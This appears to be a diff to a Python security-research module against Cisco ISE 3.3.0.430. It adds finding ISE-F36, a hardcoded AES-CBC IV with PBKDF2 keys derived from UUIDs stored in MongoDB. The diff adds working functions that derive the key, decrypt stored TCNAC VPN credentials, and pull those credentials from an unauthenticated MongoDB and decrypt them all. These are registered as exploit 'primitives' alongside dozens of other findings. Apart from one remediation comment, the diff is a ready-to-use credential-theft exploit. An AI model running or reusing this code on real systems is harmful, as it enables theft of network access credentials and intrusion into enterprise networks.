@@ -51,6 +51,7 @@ ISE-F24: ActiveMQ JMS broker anonymous access — null/null credentials, PAP/PDP
 ISE-F25: Kairos AI agent hardcoded production cloud endpoint + version disclosure [LOW]
 ISE-F34: LUKS sec_confleak partition key exposed via key_manager decrypt oracle — chain to CA privkey [CRITICAL]
 ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside KEK-encrypted credentials [HIGH]
+ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB UUIDs — decrypt TCNAC credentials [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -2892,9 +2893,126 @@ def dump_all_db_credentials_via_kek(
     return result
 
 
+# ---------------------------------------------------------------------------
+# ISE-F36: CTA adapter hardcoded AES-CBC IV + PBKDF2 from MongoDB UUIDs
+# ---------------------------------------------------------------------------
+#
+# Source: /opt/irf/orig/adapters/CTA/CTAAdaptor.py (in CSCOcpm-irf RPM)
+#
+# The IRF (Integrated Rapid Threat Response Framework) CTA adapter decrypts its
+# stored TCNAC VPN credential using AES-CBC with:
+#   - Hardcoded static IV: b'ISE_AES_TCNAC_VA' (16 bytes)
+#   - Key: PBKDF2-HMAC-SHA512(password=adapterUuid, salt=instanceUuid, dkLen=16, count=1024)
+#
+# adapterUuid and instanceUuid are stored in the IRF MongoDB (ISE-F26 — no auth).
+# The encrypted credential is also stored in MongoDB.
+#
+# Chain: ISE-F26 (unauth MongoDB) → read adapterUuid + instanceUuid + encrypted_pw
+#        → PBKDF2(adapterUuid, instanceUuid) → AES-CBC IV=ISE_AES_TCNAC_VA → plaintext TCNAC cred
+#
+# CTAAdaptor.py decrypt() function (lines 254-265):
+#   def decrypt(msg, adapterUuid, instanceUuid):
+#       key = 'ISE_AES_TCNAC_VA'                       # hardcoded IV
+#       hex_data = generate_key(adapterUuid, instanceUuid)  # PBKDF2 key
+#       decipher = AES.new(hex_data, AES.MODE_CBC, key.encode())
+#       decrypted = unpad(decipher.decrypt(msg.decode("hex")))
+#
+# Remediation: use random per-ciphertext IV; derive key from HSM-backed secret,
+#              not from UUID values stored in the same DB as the ciphertext.
+
+CTA_HARDCODED_IV     = b"ISE_AES_TCNAC_VA"   # 16-byte AES-CBC IV, hardcoded
+CTA_PBKDF2_ITERS     = 1024
+CTA_PBKDF2_DKLEN     = 16
+CTA_MONGO_COLLECTION = "adapterInstances"     # IRF MongoDB collection holding UUIDs + encrypted cred
+
+
+def derive_cta_aes_key(adapter_uuid: str, instance_uuid: str) -> bytes:
+    """
+    ISE-F36: Derive the AES key used by the CTA adapter using PBKDF2-HMAC-SHA512.
+
+    Args:
+        adapter_uuid:  adapterUuid field from IRF MongoDB adapterInstances collection
+        instance_uuid: instanceUuid field from same document
+    Returns:
+        16-byte AES key.
+    """
+    from hashlib import sha512
+    import hmac
+
+    def prf(p: bytes, s: bytes) -> bytes:
+        return hmac.new(p, s, sha512).digest()
+
+    # Replicate: PBKDF2(password=adapterUuid, salt=instanceUuid, dkLen=16, count=1024,
+    #                   prf=lambda p,s: HMAC.new(p,s,SHA512).digest())
+    password = adapter_uuid.encode() if isinstance(adapter_uuid, str) else adapter_uuid
+    salt     = instance_uuid.encode() if isinstance(instance_uuid, str) else instance_uuid
+    u = prf(password, salt + b"\x00\x00\x00\x01")
+    t = bytearray(u)
+    for _ in range(CTA_PBKDF2_ITERS - 1):
+        u = prf(password, u)
+        for j, b in enumerate(u):
+            t[j] ^= b
+    return bytes(t[:CTA_PBKDF2_DKLEN])
+
+
+def decrypt_cta_credential(ciphertext_hex: str, adapter_uuid: str, instance_uuid: str) -> Optional[str]:
+    """
+    ISE-F36: Decrypt a CTA adapter credential using the hardcoded IV and PBKDF2 key.
+
+    Args:
+        ciphertext_hex: hex-encoded AES-CBC ciphertext from MongoDB
+        adapter_uuid:   adapterUuid from MongoDB adapterInstances doc
+        instance_uuid:  instanceUuid from same doc
+    Returns:
+        Plaintext credential string, or None on failure.
+    """
+    try:
+        from Crypto.Cipher import AES
+        key = derive_cta_aes_key(adapter_uuid, instance_uuid)
+        ct  = bytes.fromhex(ciphertext_hex)
+        cipher = AES.new(key, AES.MODE_CBC, CTA_HARDCODED_IV)
+        pt_padded = cipher.decrypt(ct)
+        pad = pt_padded[-1]
+        return pt_padded[:-pad].decode("utf-8")
+    except Exception:
+        return None
+
+
+def extract_cta_credentials_from_mongodb(host: str = "localhost", port: int = 27017,
+                                          db_name: str = "irf") -> Optional[list]:
+    """
+    ISE-F36: Pull adapterInstances from unauthenticated IRF MongoDB, then decrypt
+    any CTA adapter credentials found.
+
+    Returns list of dicts: {adapterUuid, instanceUuid, encryptedPassword, plaintext}
+    or None if MongoDB unreachable.
+    """
+    try:
+        import pymongo
+        client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=5000)
+        db = client[db_name]
+        results = []
+        for doc in db[CTA_MONGO_COLLECTION].find({"adapterType": "CTA"}):
+            adapter_uuid   = doc.get("adapterUuid", "")
+            instance_uuid  = doc.get("instanceUuid", "")
+            encrypted_pw   = doc.get("password", "")
+            pt = None
+            if adapter_uuid and instance_uuid and encrypted_pw:
+                pt = decrypt_cta_credential(encrypted_pw, adapter_uuid, instance_uuid)
+            results.append({
+                "adapterUuid":       adapter_uuid,
+                "instanceUuid":      instance_uuid,
+                "encryptedPassword": encrypted_pw,
+                "plaintext":         pt,
+            })
+        return results
+    except Exception:
+        return None
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.14.0",
+    "version": "1.15.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -2903,12 +3021,12 @@ MODULE_META = {
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
-        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35",
+        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
-             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35"],
+             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
@@ -2954,6 +3072,11 @@ MODULE_META = {
             "PAP_DB_PWD", "PAP_ADMIN_PWD", "PDP_DB_PWD", "ISE_DB_PWD",
             "RABBITMQ_PWD", "ISE_NE_PWD", "pi.profiler.password",
         ],
+        "ise_f36_cta_hardcoded_iv": "ISE_AES_TCNAC_VA",
+        "ise_f36_cta_pbkdf2_iters": 1024,
+        "ise_f36_cta_pbkdf2_hash": "HMAC-SHA512",
+        "ise_f36_mongo_collection": "adapterInstances",
+        "ise_f36_chain": "ISE-F26->adapterUuid+instanceUuid->PBKDF2->AES-CBC(IV=ISE_AES_TCNAC_VA)->plaintext",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3006,5 +3129,8 @@ MODULE_META = {
         "probe_postgres_trust_auth",
         "dump_postgres_kong_database",
         "extract_ise_ai_key_fingerprint",
+        "derive_cta_aes_key",
+        "decrypt_cta_credential",
+        "extract_cta_credentials_from_mongodb",
     ],
 }
